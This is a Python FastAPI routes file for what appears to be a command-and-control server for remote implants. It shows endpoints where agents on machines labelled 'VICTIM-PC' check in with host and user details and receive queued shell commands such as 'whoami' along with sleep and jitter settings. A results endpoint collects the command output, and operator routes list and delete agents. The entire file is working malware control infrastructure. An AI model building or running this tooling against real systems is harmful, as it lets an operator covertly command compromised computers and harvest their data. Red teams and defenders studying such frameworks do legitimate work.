"""
Agent API Routes

Endpoints for agent communication:
- /beacon - Agent check-in
- /tasks - Get pending tasks
- /results - Submit task results
"""

from fastapi import APIRouter, Depends, HTTPException
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy import select, update
from typing import List
from datetime import datetime
import uuid

from app.core.database import get_db
from app.models.database.agent import Agent, AgentStatus
from app.models.database.task import Task, TaskStatus
from app.models.database.result import Result
from app.models.schemas.agent import AgentCreate, AgentResponse
from app.api.deps import get_current_active_user, get_current_operator
from app.models.database.operator import Operator



router = APIRouter()


@router.post("/beacon")
async def agent_beacon(
    agent_data: AgentCreate,
    db: AsyncSession = Depends(get_db)
):
    """
    Agent beacon endpoint.
    
    This is called every time an agent "checks in".
    
    Flow:
    1. Agent sends its info (hostname, IP, OS, etc.)
    2. Server checks if agent exists
    3. If new: Register agent in database
    4. If existing: Update last_seen timestamp
    5. Return pending tasks for this agent
    
    Example request:
    POST /api/v1/agents/beacon
    {
        "agent_id": "abc-123",
        "hostname": "VICTIM-PC",
        "username": "john",
        "internal_ip": "192.168.1.100",
        "os": "Windows 11",
        "architecture": "x64"
    }
    
    Example response:
    {
        "agent": {...},
        "tasks": [
            {"id": "...", "task_type": "shell", "command": "whoami"}
        ]
    }
    """
    
    # Check if agent already exists
    result = await db.execute(
        select(Agent).where(Agent.agent_id == agent_data.agent_id)
    )
    agent = result.scalar_one_or_none()
    
    if not agent:
        # New agent - register it
        agent = Agent(
            agent_id=agent_data.agent_id,
            hostname=agent_data.hostname,
            username=agent_data.username,
            domain=agent_data.domain,
            internal_ip=agent_data.internal_ip,
            external_ip=agent_data.external_ip,
            os=agent_data.os,
            os_version=agent_data.os_version,
            architecture=agent_data.architecture,
            status=AgentStatus.ACTIVE,
            last_seen=datetime.utcnow()
        )
        db.add(agent)
        await db.commit()
        await db.refresh(agent)
        
        print(f"✅ New agent registered: {agent.agent_id} ({agent.hostname})")
    else:
        # Existing agent - update last_seen
        agent.update_last_seen()
        agent.status = AgentStatus.ACTIVE
        await db.commit()
        await db.refresh(agent)
        
        print(f"📡 Agent beacon: {agent.agent_id} ({agent.hostname})")
    
    # Get pending tasks for this agent
    task_result = await db.execute(
        select(Task)
        .where(Task.agent_id == agent.id)
        .where(Task.status == TaskStatus.PENDING)
        .order_by(Task.priority.asc(), Task.created_at.asc())
    )
    pending_tasks = task_result.scalars().all()
    
    # Mark tasks as sent
    for task in pending_tasks:
        task.mark_sent()
    await db.commit()
    
    # Format tasks for agent
    tasks_data = [
        {
            "id": str(task.id),
            "task_type": task.task_type.value,
            "command": task.command,
            "arguments": task.arguments
        }
        for task in pending_tasks
    ]
    
    return {
        "agent": {
            "id": str(agent.id),
            "agent_id": agent.agent_id,
            "sleep_interval": agent.sleep_interval,
            "jitter": agent.jitter
        },
        "tasks": tasks_data
    }


@router.post("/results")
async def submit_result(
    result_data: dict,
    db: AsyncSession = Depends(get_db)
):
    """
    Submit task result.
    
    Called by agent after executing a task.
    
    Example request:
    POST /api/v1/agents/results
    {
        "task_id": "550e8400-e29b-41d4-a716-446655440000",
        "agent_id": "abc-123",
        "output": "DESKTOP\\Administrator",
        "error": null,
        "execution_time": 0.234
    }
    
    Response:
    {
        "status": "received",
        "result_id": "..."
    }
    """
    
    task_id = uuid.UUID(result_data["task_id"])
    
    # Get task
    task_result = await db.execute(
        select(Task).where(Task.id == task_id)
    )
    task = task_result.scalar_one_or_none()
    
    if not task:
        raise HTTPException(status_code=404, detail="Task not found")
    
    # Create result
    result = Result(
        task_id=task_id,
        agent_id=task.agent_id,
        output=result_data.get("output"),
        error=result_data.get("error"),
        execution_time=result_data.get("execution_time")
    )
    db.add(result)
    
    # Update task status
    if result_data.get("error"):
        task.mark_failed(result_data["error"])
    else:
        task.mark_completed()
    
    await db.commit()
    await db.refresh(result)
    
    print(f"✅ Result received for task {task.id}")
    
    return {
        "status": "received",
        "result_id": str(result.id)
    }


@router.get("", response_model=List[AgentResponse])
async def list_agents(
    status: str = None,
    current_user: Operator = Depends(get_current_active_user),
    db: AsyncSession = Depends(get_db)
):
    """
    List all agents.
    
    Optional filter by status: ?status=active
    
    Example response:
    [
        {
            "id": "...",
            "agent_id": "abc-123",
            "hostname": "VICTIM-PC",
            "status": "active",
            "last_seen": "2024-01-20T15:30:00",
            ...
        }
    ]
    """
    
    query = select(Agent)
    
    if status:
        try:
            status_enum = AgentStatus(status)
            query = query.where(Agent.status == status_enum)
        except ValueError:
            raise HTTPException(status_code=400, detail=f"Invalid status: {status}")
    
    result = await db.execute(query.order_by(Agent.last_seen.desc()))
    agents = result.scalars().all()
    
    return agents


@router.get("/{agent_id}")
async def get_agent(
    agent_id: str,
    db: AsyncSession = Depends(get_db)
):
    """
    Get specific agent by agent_id.
    
    Example: GET /api/v1/agents/abc-123
    """
    
    result = await db.execute(
        select(Agent).where(Agent.agent_id == agent_id)
    )
    agent = result.scalar_one_or_none()
    
    if not agent:
        raise HTTPException(status_code=404, detail="Agent not found")
    
    return agent


@router.delete("/{agent_id}")
async def delete_agent(
    agent_id: str,
    current_user: Operator = Depends(get_current_operator),
    db: AsyncSession = Depends(get_db)
):
    """
    Delete an agent.
    
    Example: DELETE /api/v1/agents/abc-123
    """
    
    result = await db.execute(
        select(Agent).where(Agent.agent_id == agent_id)
    )
    agent = result.scalar_one_or_none()
    
    if not agent:
        raise HTTPException(status_code=404, detail="Agent not found")
    
    await db.delete(agent)
    await db.commit()
    
    print(f"🗑️  Agent deleted: {agent_id}")
    
    return {"status": "deleted", "agent_id": agent_id}